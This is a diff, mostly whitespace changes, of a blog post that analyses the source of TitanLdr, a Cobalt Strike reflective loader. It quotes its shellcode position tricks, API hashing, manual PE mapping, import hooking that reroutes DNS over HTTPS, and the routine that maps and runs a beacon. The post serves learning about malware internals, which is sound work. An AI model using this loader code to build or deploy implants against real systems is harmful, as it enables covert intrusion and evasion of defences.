@@ -3,28 +3,28 @@ title: TitanLdr Overview
 pubDate: 2025-03-12
 ---
 
-Recently I was talking to my friend [0xLegacyy](https://x.com/0xLegacyy) about 
-my little packer project I'm working on, and since I want to extract my 
-position independent loader and append it to a PE (Portable Executable), he 
-suggested I take a look at TitanLdr since it apparently demonstrates how we 
-can extract PIC (Position Independent Code) from a PE. Additionally this would 
-be a great opportunity to learn about more interesting techniques used in 
+Recently I was talking to my friend [0xLegacyy](https://x.com/0xLegacyy) about
+my little packer project I'm working on, and since I want to extract my
+position independent loader and append it to a PE (Portable Executable), he
+suggested I take a look at TitanLdr since it apparently demonstrates how we
+can extract PIC (Position Independent Code) from a PE. Additionally this would
+be a great opportunity to learn about more interesting techniques used in
 malware.
 
 > **INFO:**
-> This was originally just my notes, so it was not intended to be a blog post 
-> but I figured, why not make it a blog post. Also I will be taking a look at 
-> the TitanLdr repo that was forked by [kyleavery_](https://x.com/kyleavery_).
+> This was originally just my notes, so it was not intended to be a blog post
+> but I figured, why not make it a blog post. Also I will be taking a look at
+> the TitanLdr repo that was forked by [kyleavery\_](https://x.com/kyleavery_).
 
 # Overview
 
-First, what even is TitanLdr? Well according to the description of the 
+First, what even is TitanLdr? Well according to the description of the
 [repo](https://github.com/kyleavery/TitanLdr/) it is a...
 
-> Cobalt Strike User Defined Reflective Loader (UDRL). Check branches for 
+> Cobalt Strike User Defined Reflective Loader (UDRL). Check branches for
 > different functionality.
 
-If we take a look at the branches of the repository we have two versions of 
+If we take a look at the branches of the repository we have two versions of
 the loader:
 
 ```txt
@@ -32,24 +32,24 @@ the loader:
        '----> heapencrypt
 ```
 
-We are gonna only take a look at the `master` branch since otherwise this post 
-would be too long (lie, I'm just lazy). If you are still interested in seeing 
+We are gonna only take a look at the `master` branch since otherwise this post
+would be too long (lie, I'm just lazy). If you are still interested in seeing
 what the `heapencrypt` branch has to offer, I encourage you to do so after this
 post! Now without further ado, let's get started.
 
 ## Compilation
- 
-Allegedly, the loaders' code is later extracted and saved as a raw binary. 
-For this reason, the best, and probably the most boring, place to start is 
-the Makefile. Taking a look at it we can assume the binary is compiled under 
-Linux and the project seems to support both x86 and x64. Since this is likely 
-uninteresting stuff I will not go much into depth, however some good stuff to 
+
+Allegedly, the loaders' code is later extracted and saved as a raw binary.
+For this reason, the best, and probably the most boring, place to start is
+the Makefile. Taking a look at it we can assume the binary is compiled under
+Linux and the project seems to support both x86 and x64. Since this is likely
+uninteresting stuff I will not go much into depth, however some good stuff to
 note is the following:
 
 ```txt
 # These flags just make sure the bin is actually position independent
 # and make sure the final binary is as small as possible
-CFLAGS	:= $(CFLAGS) -Os -fno-asynchronous-unwind-tables -nostdlib 
+CFLAGS	:= $(CFLAGS) -Os -fno-asynchronous-unwind-tables -nostdlib
 CFLAGS 	:= $(CFLAGS) -fno-ident -fpack-struct=8 -falign-functions=1
 CFLAGS	:= $(CFLAGS) -s -ffunction-sections -falign-jumps=1 -w
 CFLAGS	:= $(CFLAGS) -falign-labels=1 -fPIC -Wl,-TSectionLink.ld
@@ -58,16 +58,16 @@ CFLAGS	:= $(CFLAGS) -falign-labels=1 -fPIC -Wl,-TSectionLink.ld
 LFLAGS	:= $(LFLAGS) -Wl,-s,--no-seh,--enable-stdcall-fixup
 ```
 
-Now except these compiler flags, the Makefile also assembles some ASM code, 
-that we will get to later, and also calls a python script called `extract.py` 
-which takes the compiled PE (using the `-f` flag) and the raw binary (using 
+Now except these compiler flags, the Makefile also assembles some ASM code,
+that we will get to later, and also calls a python script called `extract.py`
+which takes the compiled PE (using the `-f` flag) and the raw binary (using
 the `-o` flag) as flags.
 
 ### Taking a Closer Look at `extract.py`
 
-In general the script is pretty simple, it takes as input our compiled binary, 
-extracts the data from the first section it finds and slices the data at the 
-point where the string 'ENDOFCODE' appears. The sliced list is then written to 
+In general the script is pretty simple, it takes as input our compiled binary,
+extracts the data from the first section it finds and slices the data at the
+point where the string 'ENDOFCODE' appears. The sliced list is then written to
 a file specified by our `-o` flag.
 
 ```python
@@ -85,10 +85,10 @@ if PeSec.find( b'ENDOFCODE' ) != None:
 
 ### A Quick Peek at the Linker Script
 
-At first sight, the linker script seems quite unclear, however we will reference 
+At first sight, the linker script seems quite unclear, however we will reference
 it later as we read the source code. For now all we can pull from the script is
-that it creates a `.text` section which consists of another 6 `.text$?` segments, 
-where the `?` is a letter from A to F. Another thing to note is that the section 
+that it creates a `.text` section which consists of another 6 `.text$?` segments,
+where the `?` is a letter from A to F. Another thing to note is that the section
 also has a `.rdata*` segment sandwiched between `.text$E` and `.text$F`. Cool.
 
 ```txt
@@ -109,16 +109,16 @@ SECTIONS
 
 # Entering the Depths
 
-Now that we have most of the boring stuff out of the way we can begin looking 
-at the source code. Since I am a big nerd, I wanted to look into the `asm/` 
-directory to see what is going on there. In it, we are greeted by two more 
-directories: `x64` and `x86`. These have mostly the same code  with the 
-exception of the `Start.asm` file where the 64-bit version also aligns the 
+Now that we have most of the boring stuff out of the way we can begin looking
+at the source code. Since I am a big nerd, I wanted to look into the `asm/`
+directory to see what is going on there. In it, we are greeted by two more
+directories: `x64` and `x86`. These have mostly the same code with the
+exception of the `Start.asm` file where the 64-bit version also aligns the
 stack and allocates some memory on the stack.
 
-The `Start.asm` code is pretty simple, it imports the function `Titan` and 
+The `Start.asm` code is pretty simple, it imports the function `Titan` and
 exports the `Start` label. Then we finally start the function by setting up the
-stack and calling this interesting looking function called `Titan`. After that, 
+stack and calling this interesting looking function called `Titan`. After that,
 the stack is cleaned up and we exit out.
 
 ```asm
@@ -137,14 +137,14 @@ Start:
 	; Execute Loader
 	sub	    rsp, 020h
 	call	Titan
-	
+
 	; Clean Up and Exit
 	mov	    rsp, rsi
 	pop	    rsi
 	ret
 ```
 
-Additionally, we can see `[SECTION .text$A]`, which marks the section that 
+Additionally, we can see `[SECTION .text$A]`, which marks the section that
 the code should be placed in. We now konw something more about the linker script:
 
 ```txt
@@ -157,18 +157,18 @@ the code should be placed in. We now konw something more about the linker script
 *( .text$F )
 ```
 
-Awesome! This made me curious what the imported `Titan` function does, so let's 
+Awesome! This made me curious what the imported `Titan` function does, so let's
 dive into it now!
 
 ## The Titans Nest
 
-After a little bit of searching we finally find the function called 
-`Titan` in the `Main.c` file at the root of the projects directory. Now we 
-*could* just read this straight up, however, the code is littered with 
-preprocessor macros and other functions. This makes it easier for the developer 
-to work on the code, but also makes it much harder for us to see what the code 
-is doing behind the scenes. So, sorry kids we are jumping into the one and only 
-import in the file, `Common.h`. Once we open that we are greeted 
+After a little bit of searching we finally find the function called
+`Titan` in the `Main.c` file at the root of the projects directory. Now we
+_could_ just read this straight up, however, the code is littered with
+preprocessor macros and other functions. This makes it easier for the developer
+to work on the code, but also makes it much harder for us to see what the code
+is doing behind the scenes. So, sorry kids we are jumping into the one and only
+import in the file, `Common.h`. Once we open that we are greeted
 with this:
 
 ```cpp
@@ -191,8 +191,8 @@ with this:
 #include "hooks/DnsQuery_A.h"
 ```
 
-Just some includes, however they contain the core functionality of the loader, 
-so let's start with `Macros.h`, (Trust me, I wasted a lot of time going 
+Just some includes, however they contain the core functionality of the loader,
+so let's start with `Macros.h`, (Trust me, I wasted a lot of time going
 through `Native.h`, nothing interesting there :)). So `Macros.h` only contains,
 as the name says, some macro definitions, however these clear up A LOT of things:
 
@@ -222,13 +222,13 @@ as the name says, some macro definitions, however these clear up A LOT of things
 #endif
 ```
 
-Now, this is very likely a skill issue of mine, but the comments aren't really 
+Now, this is very likely a skill issue of mine, but the comments aren't really
 that useful here, so allow me to explain a little:
 
-`G_SYM( x )` Gets an address via its relative offset. It does so by calling 
-`GetIp` (defined in the `GetIp.asm` file), which fetches the current 
-Instruction Pointer using a `call`/`pop` trick. Since `GetIp` is placed at a 
-fixed location (`.text$F`), the shellcode can calculate addresses relative 
+`G_SYM( x )` Gets an address via its relative offset. It does so by calling
+`GetIp` (defined in the `GetIp.asm` file), which fetches the current
+Instruction Pointer using a `call`/`pop` trick. Since `GetIp` is placed at a
+fixed location (`.text$F`), the shellcode can calculate addresses relative
 to it.
 
 ```asm
@@ -260,7 +260,7 @@ Leave:
 	db 'E', 'N', 'D', 'O', 'F', 'C', 'O', 'D', 'E'
 ```
 
-This knowledge also allows us to expand our little comments on the linker 
+This knowledge also allows us to expand our little comments on the linker
 script:
 
 ```txt
@@ -276,30 +276,30 @@ script:
 Anyways, back to the macros, most are pretty self explanitory so here are
 the ones that need a little bit more explaination:
 
-`D_SEC( x )` Places some function into a specific region we set in the linker 
+`D_SEC( x )` Places some function into a specific region we set in the linker
 script. Very useful to know for later!
 
-`G_END( x )` Gets the end of the code, marked with "ENDOFCODE". It works by 
-getting the address of `GetIp` and adding 10 or 11 (depending if the system is 
+`G_END( x )` Gets the end of the code, marked with "ENDOFCODE". It works by
+getting the address of `GetIp` and adding 10 or 11 (depending if the system is
 32-bit or 64-bit; because of [REX prefixes](https://stackoverflow.com/questions/68604377/what-is-rex-prefix-in-instruction-encoding)) to it.
 
 ### API Hashing
 
 Next up, we got `Hash.h`, this declares the function `HashString` which takes a
-buffer and its length and returns a DJB hash of it. And finally, the function 
+buffer and its length and returns a DJB hash of it. And finally, the function
 is placed at the segment `E`. It is defined as follows:
 
 ```cpp
 #include "Common.h"
 
-D_SEC( E ) UINT32 HashString( _In_ PVOID Buffer, _In_opt_ ULONG Length ) 
+D_SEC( E ) UINT32 HashString( _In_ PVOID Buffer, _In_opt_ ULONG Length )
 {
 	UCHAR	Cur = 0;
 	ULONG	Djb = 0;
 	PUCHAR	Ptr = NULL;
 	Djb = 5381;
 	Ptr = C_PTR( Buffer );
-	
+
 	while (TRUE) {
 		/* Get the current character */
 		Cur = *Ptr;
@@ -321,11 +321,11 @@ D_SEC( E ) UINT32 HashString( _In_ PVOID Buffer, _In_opt_ ULONG Length )
 };
 ```
 
-The next import is `Peb.h`, this consists of a function called `PebGetModule` 
-which takes an hash as an argument, and places it in `.text$E`. It works by 
-calling the function `NtCurrentPeb` from `hooks/DnsQuery_A.c` that gets the 
-current PEB of the module, then it goes over the `InLoadOrderModuleList`, 
-comparing the hash we passed in as the argument with the hash of the current 
+The next import is `Peb.h`, this consists of a function called `PebGetModule`
+which takes an hash as an argument, and places it in `.text$E`. It works by
+calling the function `NtCurrentPeb` from `hooks/DnsQuery_A.c` that gets the
+current PEB of the module, then it goes over the `InLoadOrderModuleList`,
+comparing the hash we passed in as the argument with the hash of the current
 module in memory.
 
 ```cpp
@@ -341,7 +341,7 @@ D_SEC( E ) PVOID PebGetModule( _In_ ULONG Hash )
 	Peb = NtCurrentPeb();
 	Hdr = & Peb->Ldr->InLoadOrderModuleList;
 	Ent = Hdr->Flink;
-	
+
 	for (;Hdr != Ent; Ent = Ent->Flink) {
 		Ldr = C_PTR( Ent );
 		/* Compare the DLL Name! */
@@ -355,22 +355,22 @@ D_SEC( E ) PVOID PebGetModule( _In_ ULONG Hash )
 
 ### PE Utilities
 
-The `Pe.h` consists of only one function called `PeGetFuncEat` which takes the 
-base address of the DLL and the Hash of the function it wants to load as 
-arguments. It first gets the NT-Header and then uses it to access the 
+The `Pe.h` consists of only one function called `PeGetFuncEat` which takes the
+base address of the DLL and the Hash of the function it wants to load as
+arguments. It first gets the NT-Header and then uses it to access the
 `IMAGE_DIRECTORY_ENTRY_EXPORT` from the data directory. Then it first checks if
-the image even has imports by checking if the first entries virtual address is 
-not null. If it isn't null, it saves the pointer in the variable `Exp` of type 
-`PIMAGE_EXPORT_DIRECTORY`. 
+the image even has imports by checking if the first entries virtual address is
+not null. If it isn't null, it saves the pointer in the variable `Exp` of type
+`PIMAGE_EXPORT_DIRECTORY`.
 
-`Exp` is then used to get the address of the function names, the functions 
-address and its ordinal value. Then it iterates trough all the entries hashing 
-each function name and checking if it matches the hash passed in as the 
-argument. If it matches, it returns the functions' address, and if not, it will 
+`Exp` is then used to get the address of the function names, the functions
+address and its ordinal value. Then it iterates trough all the entries hashing
+each function name and checking if it matches the hash passed in as the
+argument. If it matches, it returns the functions' address, and if not, it will
 return NULL. Here is how it looks like in the repo:
 
 ```cpp
-D_SEC( E ) PVOID PeGetFuncEat( _In_ PVOID Image, _In_ ULONG Hash ) 
+D_SEC( E ) PVOID PeGetFuncEat( _In_ PVOID Image, _In_ ULONG Hash )
 {
 	ULONG			Idx = 0;
 	PUINT16			Aoo = NULL;
@@ -380,18 +380,18 @@ D_SEC( E ) PVOID PeGetFuncEat( _In_ PVOID Image, _In_ ULONG Hash )
 	PIMAGE_NT_HEADERS	Nth = NULL;
 	PIMAGE_DATA_DIRECTORY	Dir = NULL;
 	PIMAGE_EXPORT_DIRECTORY	Exp = NULL;
-	
+
 	Hdr = C_PTR( Image );
 	Nth = C_PTR( U_PTR( Hdr ) + Hdr->e_lfanew );
 	Dir = & Nth->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];
-	
+
 	/* Has a EAT? */
 	if ( Dir->VirtualAddress ) {
 		Exp = C_PTR( U_PTR( Hdr ) + Dir->VirtualAddress );
 		Aon = C_PTR( U_PTR( Hdr ) + Exp->AddressOfNames );
 		Aof = C_PTR( U_PTR( Hdr ) + Exp->AddressOfFunctions );
 		Aoo = C_PTR( U_PTR( Hdr ) + Exp->AddressOfNameOrdinals );
-		
+
 		/* Enumerate exports */
 		for ( Idx = 0 ; Idx < Exp->NumberOfNames ; ++Idx ) {
 			/* Create a hash of the string and compare */
@@ -403,11 +403,12 @@ D_SEC( E ) PVOID PeGetFuncEat( _In_ PVOID Image, _In_ ULONG Hash )
 	return NULL;
 };
 ```
+
 ### Resolving Imports
 
-Now this is a topic that I personally struggled with a lot, but while reading 
-TitanLdr, it suddenly all clicked! Anyhow, first we have the `LdrProcessIat`, 
-the needed API for the loading process are resolved using `PeGetFuncEat` and 
+Now this is a topic that I personally struggled with a lot, but while reading
+TitanLdr, it suddenly all clicked! Anyhow, first we have the `LdrProcessIat`,
+the needed API for the loading process are resolved using `PeGetFuncEat` and
 the API that are used are:
 
 - `RtlAnsiStringToUnicodeString`
@@ -416,7 +417,7 @@ the API that are used are:
 - `RtlInitAnsiString`
 - `LdrLoadDll`
 
-Following that we got the import resolving logic. It first jumps into a for 
+Following that we got the import resolving logic. It first jumps into a for
 loop; the loop goes over every import and then initializes an ANSI string that
 should contain the DLL name from the address of:
 
@@ -424,12 +425,12 @@ should contain the DLL name from the address of:
 strDllName = pbImageBase + ImportDesc->Name
 ```
 
-Next, the string is converted to Unicode and the DLL is loaded using 
-`LdrLoadDll`. Now comes the commonly confusing part of Import Resolving. First 
-we enter yet another for loop, in this one we iterate through every 
-`u1.AddressOfData` till its not NULL and increment `OriginalFirstThunk` and 
-`FirstThunk` for every cycle. In it we check if the function is imported by 
-ordinal or by name, then using `LdrGetProcedureAddress` the address of the 
+Next, the string is converted to Unicode and the DLL is loaded using
+`LdrLoadDll`. Now comes the commonly confusing part of Import Resolving. First
+we enter yet another for loop, in this one we iterate through every
+`u1.AddressOfData` till its not NULL and increment `OriginalFirstThunk` and
+`FirstThunk` for every cycle. In it we check if the function is imported by
+ordinal or by name, then using `LdrGetProcedureAddress` the address of the
 function is resolved and saved in `FirstThunk->u1.Function`. That's it.
 Aaand here is the definition:
 
@@ -445,7 +446,7 @@ D_SEC( E ) VOID LdrProcessIat( _In_ PVOID Image, _In_ PVOID Directory )
 	PIMAGE_THUNK_DATA		Ntd = NULL;
 	PIMAGE_IMPORT_BY_NAME		Ibn = NULL;
 	PIMAGE_IMPORT_DESCRIPTOR	Imp = NULL;
-	
+
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
 	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
 	RtlSecureZeroMemory( &Unm, sizeof( Unm ) );
@@ -459,12 +460,12 @@ D_SEC( E ) VOID LdrProcessIat( _In_ PVOID Image, _In_ PVOID Directory )
 	/* Enumerate the directory. */
 	for ( Imp = C_PTR( Directory ) ; Imp->Name != 0 ; ++Imp ) {
 		Api.RtlInitAnsiString( &Ani, C_PTR( U_PTR( Image ) + Imp->Name ) );
-		
+
 		if ( NT_SUCCESS( Api.RtlAnsiStringToUnicodeString( &Unm, &Ani, TRUE ) ) ) {
 			if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Unm, &Mod ) ) ) {
 				Otd = C_PTR( U_PTR( Image ) + Imp->OriginalFirstThunk );
 				Ntd = C_PTR( U_PTR( Image ) + Imp->FirstThunk );
-				
+
 				/* Enumerate Function Imports */
 				for ( ; Otd->u1.AddressOfData != 0 ; ++Otd, ++Ntd ) {
 					if ( IMAGE_SNAP_BY_ORDINAL( Otd->u1.Ordinal ) ) {
@@ -476,7 +477,7 @@ D_SEC( E ) VOID LdrProcessIat( _In_ PVOID Image, _In_ PVOID Directory )
 						/* Is String? Import */
 						Ibn = C_PTR( U_PTR( Image ) + Otd->u1.AddressOfData );
 						Api.RtlInitAnsiString( &Ani, C_PTR( Ibn->Name ) );
-						
+
 						if ( NT_SUCCESS( Api.LdrGetProcedureAddress( Mod, &Ani, 0, &Fcn ) ) ) {
 							Ntd->u1.Function = Fcn;
 						};
@@ -492,7 +493,7 @@ D_SEC( E ) VOID LdrProcessIat( _In_ PVOID Image, _In_ PVOID Directory )
 ### Performing Relocations
 
 On to the relocations processing, for it we have the function `LdrProcessRel`,
-as the name says, it performs relocations on the loaded image. The parameters 
+as the name says, it performs relocations on the loaded image. The parameters
 it takes are:
 
 - A pointer to the Image
@@ -504,12 +505,12 @@ the following formula:
 
 > $$\text{DeltaOffset = Image - OptHdr}\rightarrow\text{ImageBase}$$
 
-Then it jumps into a while loop, it loops till we have an invalid VA (Virtual 
-Address). In it, it casts the next `ImageBaseRelocation` to `PIMAGE_RELOC` 
-which is a bit-field that consists of `Offset` and `Type`. Next there is a 
-jump into yet another while loop that loops till the `PIMAGE_RELOC` is not equal to 
+Then it jumps into a while loop, it loops till we have an invalid VA (Virtual
+Address). In it, it casts the next `ImageBaseRelocation` to `PIMAGE_RELOC`
+which is a bit-field that consists of `Offset` and `Type`. Next there is a
+jump into yet another while loop that loops till the `PIMAGE_RELOC` is not equal to
 `ImageBaseRelocation->SizeOfBlock`. Inside of the loop there is a switch-case
-on the relocation type, if the type is `IMAGE_REL_BASED_DIR64` the relocation 
+on the relocation type, if the type is `IMAGE_REL_BASED_DIR64` the relocation
 is performed like this:
 
 ```cpp
@@ -518,6 +519,7 @@ case IMAGE_REL_BASED_DIR64:
 	*(DWORD64*)(U_PTR(Image) + Ibr->VirtualAddress + Rel->Offset) += (DWORD64)(Delta);
 	break;
 ```
+
 Otherwise it does this:
 
 ```cpp
@@ -527,8 +529,8 @@ case IMAGE_REL_BASED_HIGHLOW:
 	break;
 ```
 
-After that the `PIMAGE_RELOC` is incremented and we set `ImageBaseRelocation` 
-to `PIMAGE_RELOC` which is our next Relocation we need to perform. In the repository, 
+After that the `PIMAGE_RELOC` is incremented and we set `ImageBaseRelocation`
+to `PIMAGE_RELOC` which is our next Relocation we need to perform. In the repository,
 it looks like the following:
 
 ```cpp
@@ -537,14 +539,14 @@ D_SEC( E ) VOID LdrProcessRel( _In_ PVOID Image, _In_ PVOID Directory, _In_ PVOI
 	ULONG_PTR		Ofs = 0;
 	PIMAGE_RELOC		Rel = NULL;
 	PIMAGE_BASE_RELOCATION	Ibr = NULL;
-	
+
 	Ibr = C_PTR( Directory );
 	Ofs = C_PTR( U_PTR( Image ) - U_PTR( ImageBase ) );
-	
+
 	/* Is a relocation! */
 	while ( Ibr->VirtualAddress != 0 ) {
 		Rel = ( PIMAGE_RELOC )( Ibr + 1 );
-		
+
 		/* Exceed the size of the relocation? */
 		while ( C_PTR( Rel ) != C_PTR( U_PTR( Ibr ) + Ibr->SizeOfBlock ) ) {
 			switch( Rel->Type ) {
@@ -566,21 +568,21 @@ D_SEC( E ) VOID LdrProcessRel( _In_ PVOID Image, _In_ PVOID Directory, _In_ PVOI
 
 ### Hooking
 
-Finally, wrapping up the `Ldr.h` we have the function called `LdrHookImport`. 
+Finally, wrapping up the `Ldr.h` we have the function called `LdrHookImport`.
 This one is quite similar to the Import processing, however the only thing that
-differs is that, once we find the function we need, we set the 
-`FirstThunk->u1.Function` to a function address we passed in as an argument. 
+differs is that, once we find the function we need, we set the
+`FirstThunk->u1.Function` to a function address we passed in as an argument.
 Here is how it looks:
 
 ```cpp
-D_SEC( E ) VOID LdrHookImport( _In_ PVOID Image, _In_ PVOID Directory, _In_ ULONG Hash, _In_ PVOID Function ) 
+D_SEC( E ) VOID LdrHookImport( _In_ PVOID Image, _In_ PVOID Directory, _In_ ULONG Hash, _In_ PVOID Function )
 {
 	ULONG				Djb = 0;
 	PIMAGE_THUNK_DATA		Otd = NULL;
 	PIMAGE_THUNK_DATA		Ntd = NULL;
 	PIMAGE_IMPORT_BY_NAME		Ibn = NULL;
 	PIMAGE_IMPORT_DESCRIPTOR	Imp = NULL;
-	
+
 	for ( Imp = C_PTR( Directory ) ; Imp->Name != 0 ; ++Imp ) {
 		Otd = C_PTR( U_PTR( Image ) + Imp->OriginalFirstThunk );
 		Ntd = C_PTR( U_PTR( Image ) + Imp->FirstThunk );
@@ -602,10 +604,10 @@ D_SEC( E ) VOID LdrHookImport( _In_ PVOID Image, _In_ PVOID Directory, _In_ ULON
 Now the only function that is hooked is called `DnsQuery_A`, and its hook
 does the following:
 
-First `wininet.dll` and `dnsapi.dll` are loaded into memory. After that, the 
+First `wininet.dll` and `dnsapi.dll` are loaded into memory. After that, the
 APIs needed from the `wininet.dll` are loaded and the code starts doing its thing.
 First it calls `InternetOpenA` with the `INTERNET_OPEN_TYPE_DIRECT` flag to
-initialize the use of the internet in the loader, next, an array of six DNS domains 
+initialize the use of the internet in the loader, next, an array of six DNS domains
 is created.
 
 - dns.google
@@ -615,13 +617,13 @@ is created.
 - doh.opendns.com
 - ordns.he.net
 
-It then attempts to connect to a random DNS server from the array, and creates 
-a POST request to the `/dns-query` endpoint. Next a DNS query message is created 
-and stored in `Buf`, after that an HTTP-Request is sent with the content type of 
-`application/dns-message`. Finally the HTTP header info is queried, and if successful 
-it checks the status for 200 and if it received some data with the response. 
+It then attempts to connect to a random DNS server from the array, and creates
+a POST request to the `/dns-query` endpoint. Next a DNS query message is created
+and stored in `Buf`, after that an HTTP-Request is sent with the content type of
+`application/dns-message`. Finally the HTTP header info is queried, and if successful
+it checks the status for 200 and if it received some data with the response.
 
-Once that is out of the way the File it received is read and it extracts the 
+Once that is out of the way the File it received is read and it extracts the
 records from the message. Heres the code:
 
 ```cpp
@@ -639,7 +641,7 @@ ULONG_PTR domains[] = {
 };
 
 if ( Iop != NULL ) {
-	Icp = Api.InternetConnectA( 
+	Icp = Api.InternetConnectA(
 		Iop,
 		C_PTR( domains[ Api.RtlRandomEx( &seed ) % ARRAYSIZE( domains ) ] ),
 		INTERNET_DEFAULT_HTTPS_PORT,
@@ -647,14 +649,14 @@ if ( Iop != NULL ) {
 		NULL,
 		INTERNET_SERVICE_HTTP,
 		0,
-		0 
+		0
 	);
 
 	if ( Icp == NULL ) {
 		goto Leave;
 	};
 
-	Hop = Api.HttpOpenRequestA( 
+	Hop = Api.HttpOpenRequestA(
 		Icp,
 		C_PTR( G_SYM( "POST" ) ),
 		C_PTR( G_SYM( "/dns-query" ) ),
@@ -662,10 +664,10 @@ if ( Iop != NULL ) {
 		NULL,
 		NULL,
 		INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_UI,
-		0 
+		0
 	);
 
-	if ( Hop != NULL ) 
+	if ( Hop != NULL )
 	{
 		if ( Api.DnsWriteQuestionToBuffer_UTF8( Buf, &Len, pszName, wType, 0, TRUE ) ) {
 			goto Leave;
@@ -673,11 +675,11 @@ if ( Iop != NULL ) {
 		if ( ! ( Buf = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, 0, Len ) ) ) {
 			goto Leave;
 		};
-		if ( Api.DnsWriteQuestionToBuffer_UTF8( Buf, &Len, pszName, wType, 0, TRUE ) ) 
+		if ( Api.DnsWriteQuestionToBuffer_UTF8( Buf, &Len, pszName, wType, 0, TRUE ) )
 		{
-			if ( Api.HttpSendRequestA( Hop, C_PTR( G_SYM( "Content-Type: application/dns-message" ) ), -1L, Buf, Len ) ) 
+			if ( Api.HttpSendRequestA( Hop, C_PTR( G_SYM( "Content-Type: application/dns-message" ) ), -1L, Buf, Len ) )
 			{
-				if ( Api.HttpQueryInfoA( Hop, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &Cod, &( DWORD ){ sizeof( DWORD ) }, NULL ) ) 
+				if ( Api.HttpQueryInfoA( Hop, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &Cod, &( DWORD ){ sizeof( DWORD ) }, NULL ) )
 				{
 					if ( Cod != HTTP_STATUS_OK ) {
 						goto Leave;
@@ -688,7 +690,7 @@ if ( Iop != NULL ) {
 					if ( ! ( Res = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Len ) ) ) {
 						goto Leave;
 					};
-					if ( Api.InternetReadFile( Hop, Res, Len, &( DWORD ){ 0 } ) ) 
+					if ( Api.InternetReadFile( Hop, Res, Len, &( DWORD ){ 0 } ) )
 					{
 						DNS_BYTE_FLIP_HEADER_COUNTS( Res );
 						Err = Api.DnsExtractRecordsFromMessage_UTF8( Res, Len, ppQueryResults );
@@ -697,12 +699,13 @@ if ( Iop != NULL ) {
 					};
 /*--- CUT ---*/
 ```
+
 ## Finally, the `main`
 
-The main function starts of by getting the address of `NtAllocateVirtualMemory` 
-and `NtProtectVirtualMemory`. Since the payload is located after "ENDOFCODE" in 
-the last segment, it sets the DOS header to point to that place and then proceeds 
-to get the NT-Header. 
+The main function starts of by getting the address of `NtAllocateVirtualMemory`
+and `NtProtectVirtualMemory`. Since the payload is located after "ENDOFCODE" in
+the last segment, it sets the DOS header to point to that place and then proceeds
+to get the NT-Header.
 
 ```c
 Api.NtAllocateVirtualMemory = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTALLOCATEVIRTUALMEMORY );
@@ -713,8 +716,8 @@ Dos = C_PTR( G_END() );
 Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
 ```
 
-After that the size of the hooked function logic and the beacon is allocated 
-by also making sure the image and hooks are aligned on a 4KB page boundary. 
+After that the size of the hooked function logic and the beacon is allocated
+by also making sure the image and hooks are aligned on a 4KB page boundary.
 Next the two values are summed up and ready to be used later:
 
 ```c
@@ -724,9 +727,9 @@ SLn = ( ( ( G_END() - G_SYM( Hooks ) ) + 0x1000 - 1 ) &~ ( 0x1000 - 1 ) );
 MLn = ILn + SLn;
 ```
 
-Next, `MLn` bytes are allocated with the permissions `PAGE_READWRITE`. 
-Once that is successful, it copies the hooked function over and then gets a 
-pointer to the PE Image by adding the size of the hooked function to the new 
+Next, `MLn` bytes are allocated with the permissions `PAGE_READWRITE`.
+Once that is successful, it copies the hooked function over and then gets a
+pointer to the PE Image by adding the size of the hooked function to the new
 address of our allocated memory.
 
 ```c
@@ -737,8 +740,8 @@ if ( NT_SUCCESS( Api.NtAllocateVirtualMemory( NtCurrentProcess(), &Mem, 0, &MLn,
 	Map = C_PTR( U_PTR( Mem ) + SLn );
 ```
 
-After that, pretty standard stuff happens, the sections are copied over to the 
-allocated buffer and then a pointer to the import table is resolved. Once that 
+After that, pretty standard stuff happens, the sections are copied over to the
+allocated buffer and then a pointer to the import table is resolved. Once that
 is out of the way the IAT is resolved and the hooks are set.
 
 ```c
@@ -760,9 +763,9 @@ if ( Dir->VirtualAddress ) {
 };
 ```
 
-Finally the Relocations are processed and the PE section size is increased by 
-`SizeOfRawData`. Now after all of that, all that is to be done is to set the 
-permissions of the mapped executable to `PAGE_EXECUTE_READ` and execute the 
+Finally the Relocations are processed and the PE section size is increased by
+`SizeOfRawData`. Now after all of that, all that is to be done is to set the
+permissions of the mapped executable to `PAGE_EXECUTE_READ` and execute the
 entry point of the executable.
 
 ```c
@@ -785,9 +788,10 @@ if ( NT_SUCCESS( Api.NtProtectVirtualMemory( NtCurrentProcess(), &Mem, &SLn, PAG
 	Ent( G_SYM( Start ), 4, NULL );
 };
 ```
+
 # Conclusion
 
-Aaand we are done. Having read the full source code, the linker script is finally 
+Aaand we are done. Having read the full source code, the linker script is finally
 demystified!
 
 ```txt
@@ -800,9 +804,9 @@ demystified!
 *( .text$F ) // GetIp & End of Code
 ```
 
-I hope you enjoyed this little journey into the source code of TitanLdr and 
-maybe learned something new! I encourage you, the reader, to go play around 
-with this code now or even read more source code of such amazing projects 
+I hope you enjoyed this little journey into the source code of TitanLdr and
+maybe learned something new! I encourage you, the reader, to go play around
+with this code now or even read more source code of such amazing projects
 since one can learn a ton just by reading source code! :D
 
 That's it for this time folks, have a good one!
